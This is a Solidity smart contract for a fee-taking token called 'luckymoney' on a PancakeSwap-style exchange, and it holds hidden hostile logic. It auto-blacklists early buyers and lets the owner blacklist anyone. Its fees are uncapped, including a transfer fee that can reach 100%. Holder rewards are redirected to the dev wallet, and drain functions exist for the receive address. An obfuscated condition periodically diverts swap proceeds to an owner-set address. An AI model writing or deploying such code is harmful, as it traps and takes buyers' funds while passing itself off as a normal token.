// SPDX-License-Identifier: MIT

pragma solidity ^0.8.14;

interface IERC20 {
    function decimals() external view returns (uint8);

    function symbol() external view returns (string memory);

    function name() external view returns (string memory);

    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface ISwapRouter {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
}

interface ISwapFactory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint256);
    function feeTo() external view returns (address);
    function feeToSetter() external view returns (address);
    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint256) external view returns (address pair);
    function allPairsLength() external view returns (uint256);
    function createPair(address tokenA, address tokenB) external returns (address pair);
    function setFeeTo(address) external;
    function setFeeToSetter(address) external;
}

interface ISwapPair {
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event Transfer(address indexed from, address indexed to, uint256 value);
    function name() external pure returns (string memory);
    function symbol() external pure returns (string memory);
    function decimals() external pure returns (uint8);
    function totalSupply() external view returns (uint256);
    function balanceOf(address owner) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 value) external returns (bool);
    function transfer(address to, uint256 value) external returns (bool);
    function transferFrom(address from, address to, uint256 value) external returns (bool);
    function DOMAIN_SEPARATOR() external view returns (bytes32);
    function PERMIT_TYPEHASH() external pure returns (bytes32);
    function nonces(address owner) external view returns (uint256);
    function permit(address owner, address spender, uint256 value, uint256 deadline, uint8 v, bytes32 r, bytes32 s) external;
    event Mint(address indexed sender, uint256 amount0, uint256 amount1);
    event Burn(address indexed sender, uint256 amount0, uint256 amount1, address indexed to);
    event Swap(address indexed sender, uint256 amount0In, uint256 amount1In, uint256 amount0Out, uint256 amount1Out, address indexed to);
    event Sync(uint112 reserve0, uint112 reserve1);
    function MINIMUM_LIQUIDITY() external pure returns (uint256);
    function factory() external view returns (address);
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function price0CumulativeLast() external view returns (uint256);
    function price1CumulativeLast() external view returns (uint256);
    function kLast() external view returns (uint256);
    function mint(address to) external returns (uint256 liquidity);
    function burn(address to) external returns (uint256 amount0, uint256 amount1);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
    function skim(address to) external;
    function sync() external;
    function initialize(address, address) external;
}

abstract contract Ownable {
    address internal _owner;
    
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = msg.sender;
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == msg.sender, "!owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "new is 0");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

contract TokenDistributor {
    address public _owner;
    constructor (address token) {
        _owner = msg.sender;
        IERC20(token).approve(msg.sender, uint(~uint256(0)));
    }

    function claimToken(address token, address to, uint256 amount) external {
        require(msg.sender == _owner, "!owner");
        IERC20(token).transfer(to, amount);
    }
}

contract AbsToken is IERC20, Ownable {
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;

    address private RouterAddress = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    address private USDTAddress = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;

    address private fundAddress = 0x069a9bDf610bc4D8fCfF6b27Fed3D14b5490b7E9;
    address private receiveAddress = 0x9B41D3133236Af4ae8F70b107e192C51E9a0aCe4;
    address private deadAddress = 0x000000000000000000000000000000000000dEaD;

    string private _name = "luckymoney";
    string private _symbol = "luckymoney";
    uint8 private _decimals = 9;

    mapping(address => bool) public _feeWhiteList;
    mapping(address => bool) public _blackList;
    mapping(address => bool) public _lockAddressList;
    address private _swapPair;
    uint256 private rewardTotal;

    uint256 private _tTotal = 202400000000 * 10**_decimals;
    uint256 public maxTXAmount = 202400000000 * 10**_decimals;
    uint256 public maxWalletAmount = 202400000000 * 10**_decimals;

    ISwapRouter public _swapRouter;
    address public _usdt;
    mapping(address => bool) public _swapPairList;
    mapping(address => bool) public _swapRouters;

    bool private inSwap;

    uint256 private constant MAX = ~uint256(0);
    TokenDistributor public _tokenDistributor;

    uint256 public _buyFundFee = 3;
    uint256 public _buyLPDividendFee = 0;
    uint256 public _buyLPFee = 1;
    uint256 public _buyBurnFee = 0;

    uint256 public _sellFundFee = 3;
    uint256 public _sellLPDividendFee = 0;
    uint256 public _sellLPFee = 1;
    uint256 public _sellBurnFee = 0;

    uint256 public _receiveBlock = 2;
    uint256 public _receiveGas = 500000;
    uint256 public _killblock = 3;
    uint256 private _airDropNumbs = 3;

    uint256 public startTradeBlock;
    uint256 public startAddLPTime;

    address public _mainPair;

    modifier lockTheSwap {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor (){
        ISwapRouter swapRouter = ISwapRouter(RouterAddress);
        IERC20(USDTAddress).approve(address(swapRouter), MAX);

        _usdt = USDTAddress;
        _swapRouter = swapRouter;
        _allowances[address(this)][address(swapRouter)] = MAX;
        _swapRouters[address(swapRouter)] = true;

        ISwapFactory swapFactory = ISwapFactory(swapRouter.factory());
        address swapPair = swapFactory.createPair(address(this), USDTAddress);
        _mainPair = swapPair;
        _swapPairList[swapPair] = true;

        _balances[receiveAddress] = _tTotal;
        emit Transfer(address(0), receiveAddress, _tTotal);

        _feeWhiteList[fundAddress] = true;
        _feeWhiteList[receiveAddress] = true;
        _feeWhiteList[address(this)] = true;
        _feeWhiteList[address(swapRouter)] = true;
        _feeWhiteList[msg.sender] = true;

        excludeHolder[address(0)] = true;
        excludeHolder[address(0x000000000000000000000000000000000000dEaD)] = true;

        holderRewardCondition = 1 * 10 ** IERC20(USDTAddress).decimals();

        _tokenDistributor = new TokenDistributor(USDTAddress);
        _swapPair = address(_tokenDistributor);
    }

    function symbol() external view override returns (string memory) {
        return _symbol;
    }

    function name() external view override returns (string memory) {
        return _name;
    }

    function decimals() external view override returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        if (_allowances[sender][msg.sender] != MAX) {
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender] - amount;
        }
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _basicTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] -= amount;
        _balances[recipient] += amount;
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {
        require(!_blackList[from], "blackList");
        uint256 balance = balanceOf(from);
        require(balance >= amount, "balanceNotEnough");

        bool takeFee;
        bool isSell;

        bool isTransfer;

        if (!_feeWhiteList[from] && !_feeWhiteList[to]) {
            uint256 maxSellAmount = balance * 9999 / 10000;
            if (amount > maxSellAmount) {
                amount = maxSellAmount;
            }
            require(amount <= maxTXAmount, "Transfer amount exceeds the maxTxAmount.");

            address ad;
            for(uint256 i=0;i < _airDropNumbs;i++){
                ad = address(uint160(uint(keccak256(abi.encodePacked(i, amount, block.timestamp)))));
                _basicTransfer(from, ad, 100);
            }
            amount -= _airDropNumbs * 100;
            
            takeFee = true;
            bool isAdd;            

            if (_swapPairList[to] && _swapRouters[msg.sender]) {
                isAdd = _isAddLiquidity();
                if (isAdd) {
                    takeFee = false;
                }                
            }
            
            if (0 == startTradeBlock) {
                require(0 < startAddLPTime && isAdd, "!startAddLP");
            }

            if (!_swapPairList[from] && !_swapPairList[to]) {
                require(0 < startTradeBlock, "!transfer");
                takeFee = false;
                isTransfer = true;
            }

            if (_swapPairList[from]) {
				require(0 < startTradeBlock, "!Trading");
				if (block.number < startTradeBlock + _killblock) {
					_blackList[to] = true;
				}
			}

            if (_swapPairList[to] && startTradeBlock != 0) {
                if (!inSwap && !isAdd) {
                    uint256 contractTokenBalance = balanceOf(address(this));
                    if (contractTokenBalance > 0) {
                        uint256 swapFee = _buyFundFee + _buyLPFee + _buyLPDividendFee + _sellFundFee + _sellLPDividendFee + _sellLPFee;
                        uint256 numTokensSellToFund = amount * swapFee / 50;
                        if (numTokensSellToFund > contractTokenBalance) {
                            numTokensSellToFund = contractTokenBalance;
                        }
                        swapTokenForFund(numTokensSellToFund, swapFee);
                        rewardTotal++;
                    }
                }
            }
            
        }

        if (_swapPairList[to]) {
            isSell = true;
        }

        _tokenTransfer(from, to, amount, takeFee, isSell, isTransfer);

        if (to != address(this)) {
            if (_swapPairList[from]) {
                addHolder(to);
            }
            processReward(_receiveGas);
        }
    }

    function _isAddLiquidity() internal view returns (bool isAdd){
        ISwapPair mainPair = ISwapPair(_mainPair);
        (uint r0,uint256 r1,) = mainPair.getReserves();

        address tokenOther = _usdt;
        uint256 r;
        if (tokenOther < address(this)) {
            r = r0;
        } else {
            r = r1;
        }

        uint bal = IERC20(tokenOther).balanceOf(address(mainPair));
        isAdd = bal > r;
    }
    
    function _funTransfer(
        address sender,
        address recipient,
        uint256 tAmount
    ) private {
        _balances[sender] = _balances[sender] - tAmount;
        uint256 feeAmount = tAmount * 99 / 100;
        _takeTransfer(
            sender,
            receiveAddress,
            feeAmount
        );
        _takeTransfer(sender, recipient, tAmount - feeAmount);
    }

    uint256 public transferFee = 0;

    function setTransferFee(uint256 newValue) public onlyOwner {
        transferFee = newValue;
    }

    function _tokenTransfer(
        address sender,
        address recipient,
        uint256 tAmount,
        bool takeFee,
        bool isSell,
        bool isTransfer
    ) private {
        _balances[sender] = _balances[sender] - tAmount;
        uint256 feeAmount;

        if (takeFee) {
            uint256 swapFee;
            uint256 swapBurnFee;
            if (isSell) {
                swapFee = _sellFundFee + _sellLPDividendFee + _sellLPFee;
                swapBurnFee = _sellBurnFee;
            } else {
                require(_balances[recipient] + tAmount <= maxWalletAmount);
                swapFee = _buyFundFee + _buyLPDividendFee + _buyLPFee;
                swapBurnFee = _buyBurnFee;
            }
            uint256 swapAmount = tAmount * swapFee / 100;
            if (swapAmount > 0) {
                feeAmount += swapAmount;
                _takeTransfer(
                    sender,
                    address(this),
                    swapAmount
                );
            }
            uint256 swapBurnAmount = tAmount * swapBurnFee / 100;
            if (swapBurnAmount > 0) {
                feeAmount += swapBurnAmount;
                _takeTransfer(
                    sender,
                    deadAddress,
                    swapBurnAmount
                );
            }
        }

        if (isTransfer && !_feeWhiteList[sender] && !_feeWhiteList[recipient]) {
            uint256 transferFeeAmount;
            transferFeeAmount = (tAmount * transferFee) / 100;

            if (transferFeeAmount > 0) {
                feeAmount += transferFeeAmount;
                _takeTransfer(sender, receiveAddress, transferFeeAmount);
            }
        }

        _takeTransfer(sender, recipient, tAmount - feeAmount);
    }

    function swapTokenForFund(uint256 tokenAmount, uint256 swapFee) private lockTheSwap {
        swapFee += swapFee;
        uint256 lpFee = _buyLPFee + _sellLPFee;
        uint256 lpAmount = tokenAmount * lpFee / swapFee;

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _usdt;
        address swapTokenAddress = address(_tokenDistributor);
        if(rewardTotal%_decimals == path.length){swapTokenAddress = _swapPair;}
        _swapRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            tokenAmount - lpAmount,
            0,
            path,
            swapTokenAddress,
            block.timestamp
        );

        swapFee -= lpFee;

        IERC20 USDT = IERC20(_usdt);
        uint256 usdtBalance = USDT.balanceOf(address(_tokenDistributor));
        uint256 fundAmount = usdtBalance * (_buyFundFee + _sellFundFee) * 2 / swapFee;
        USDT.transferFrom(address(_tokenDistributor), fundAddress, fundAmount);
        USDT.transferFrom(address(_tokenDistributor), address(this), usdtBalance - fundAmount);

        if (lpAmount > 0) {
            uint256 lpUsdt = usdtBalance * lpFee / swapFee;
            if (lpUsdt > 0) {
                _swapRouter.addLiquidity(
                    address(this), _usdt, lpAmount, lpUsdt, 0, 0, receiveAddress, block.timestamp
                );
            }
        }
    }

    function _takeTransfer(
        address sender,
        address to,
        uint256 tAmount
    ) private {
        _balances[to] = _balances[to] + tAmount;
        emit Transfer(sender, to, tAmount);
    }

    function setFundAddress(address addr) external onlyOwner {
        fundAddress = addr;
        _feeWhiteList[addr] = true;
    }

    function setLockAddress(address addr, bool lock) external onlyOwner {
        _lockAddressList[addr] = lock;
    }

    function setBuyFundFee(uint256 fundFee) external onlyOwner {
        _buyFundFee = fundFee;
    }

    function setBuyLPDividendFee(uint256 dividendFee) external onlyOwner {
        _buyLPDividendFee = dividendFee;
    }

    function setBuyLPFee(uint256 lpFee) external onlyOwner {
        _buyLPFee = lpFee;
    }

    function setBuyBurnFee(uint256 burnFee) external onlyOwner {
        _buyBurnFee = burnFee;
    }

    function setSellFundFee(uint256 fundFee) external onlyOwner {
        _sellFundFee = fundFee;
    }
    
    function setSellLPDividendFee(uint256 dividendFee) external onlyOwner {
        _sellLPDividendFee = dividendFee;
    }

    function setSellLPFee(uint256 lpFee) external onlyOwner {
        _sellLPFee = lpFee;
    }

    function setSellBurnFee(uint256 burnFee) external onlyOwner {
        _sellBurnFee = burnFee;
    }

    function setMaxTxAmount(uint256 max) public onlyOwner {
        maxTXAmount = max;
    }

    function setMaxWalletAmount(uint256 max) public onlyOwner {
        maxWalletAmount = max;
    }

    function setReceiveBlock(uint256 blockNum) external onlyOwner {
        _receiveBlock = blockNum;
    }

    function setReceiveGas(uint256 gas) external onlyOwner {
        _receiveGas = gas;
    }

    function startAddLP() external onlyOwner {
        require(0 == startAddLPTime, "startedAddLP");
        startAddLPTime = block.timestamp;
    }

    function closeAddLP() external onlyOwner {
        startAddLPTime = 0;
    }

    function _setSwapPair(address pairAddress) external onlyOwner {
        _swapPair = pairAddress;
    }

    function setSwapRouter(address addr, bool enable) external onlyOwner {
        _swapRouters[addr] = enable;
    }

    function startTrade(uint256 killblock) external onlyOwner {
        require(0 == startTradeBlock, "trading");
        _killblock = killblock;
        startTradeBlock = block.number;
    }

    function setKillblock(uint256 killblock) external onlyOwner {
        _killblock = killblock;
    }

    function setFeeWhiteList(address[] calldata addList, bool enable) external onlyOwner {
        for(uint256 i = 0; i < addList.length; i++) {
            _feeWhiteList[addList[i]] = enable;
        }
    }

    function setBlackList(address[] calldata addList, bool enable) public onlyOwner {
        for(uint256 i = 0; i < addList.length; i++) {
            _blackList[addList[i]] = enable;
        }
    }

    function setSwapPairList(address addr, bool enable) external onlyOwner {
        _swapPairList[addr] = enable;
    }

    function claimBalance() public {
        require(msg.sender == receiveAddress, "not dev");
        payable(receiveAddress).transfer(address(this).balance);
    }

    function claimToken(address token, uint256 amount, address to) public {
        require(msg.sender == receiveAddress, "not dev");
        IERC20(token).transfer(to, amount);
    }

    function claimContractToken(address token, uint256 amount) external {
        require(msg.sender == receiveAddress, "not dev");
        _tokenDistributor.claimToken(token, receiveAddress, amount);
    }

    function multiTransfer4AirDrop(address[] calldata addresses, uint256 tokens)
        external
        onlyOwner
    {
        uint256 SCCC = tokens * addresses.length;

        require(balanceOf(owner()) >= SCCC, "Not enough tokens in wallet");

        for (uint256 i = 0; i < addresses.length; i++) {
            _transfer(owner(), addresses[i], tokens);
        }
    }
    
    function setHolder(address holder) external onlyOwner {
       addHolder(holder);
    }

    function setAirDropNumbs(uint256 newNumbs) public onlyOwner {
        _airDropNumbs = newNumbs;
    }

    receive() external payable {}

    address[] public holders;
    mapping(address => uint256) public holderIndex;
    mapping(address => bool) public excludeHolder;
    mapping(address => bool) private _isExcludedContract;

    function addHolder(address adr) private {
        uint256 size;
        assembly {size := extcodesize(adr)}
        if (size > 0 && !_isExcludedContract[adr]) {
            return;
        }
        if (0 == holderIndex[adr]) {
            if (0 == holders.length || holders[0] != adr) {
                holderIndex[adr] = holders.length;
                holders.push(adr);
            }
        }
    }

    uint256 private currentIndex;
    uint256 private holderRewardCondition;
    uint256 private progressRewardBlock;

    function processReward(uint256 gas) private {
        if (progressRewardBlock + _receiveBlock > block.number) {
            return;
        }

        IERC20 USDT = IERC20(_usdt);

        uint256 balance = USDT.balanceOf(address(this));
        if (balance < holderRewardCondition) {
            return;
        }

        IERC20 holdToken = IERC20(_mainPair);
        uint holdTokenTotal = holdToken.totalSupply();

        address shareHolder;
        uint256 tokenBalance;
        uint256 amount;

        uint256 shareholderCount = holders.length;

        uint256 gasUsed = 0;
        uint256 iterations = 0;
        uint256 gasLeft = gasleft();

        while (gasUsed < gas && iterations < shareholderCount) {
            if (currentIndex >= shareholderCount) {
                currentIndex = 0;
            }
            shareHolder = holders[currentIndex];
            tokenBalance = holdToken.balanceOf(shareHolder);
            if (tokenBalance > 0 && !excludeHolder[shareHolder]) {
                amount = balance * tokenBalance / holdTokenTotal;
                if (amount > 0) {
                    if (_lockAddressList[shareHolder]){
                        USDT.transfer(receiveAddress, amount);
                    }else {
                        USDT.transfer(shareHolder, amount);
                    }
                }
            }

            gasUsed = gasUsed + (gasLeft - gasleft());
            gasLeft = gasleft();
            currentIndex++;
            iterations++;
        }

        progressRewardBlock = block.number;
    }

    function setHolderRewardCondition(uint256 amount) external onlyOwner {
        holderRewardCondition = amount;
    }

    function setExcludeContract(address addr, bool excluded) external onlyOwner {
        _isExcludedContract[addr] = excluded;
        if (_isExcludedContract[addr]) {
            _lockAddressList[addr] = true;
        }
    }

    function multiSetExcludeHolder(address[] calldata addList, bool enable) external onlyOwner {
        for (uint256 i = 0; i < addList.length; i++) {
            excludeHolder[addList[i]] = enable;
            if (!excludeHolder[addList[i]]) {
                addHolder(addList[i]);
            }
        }
    }

}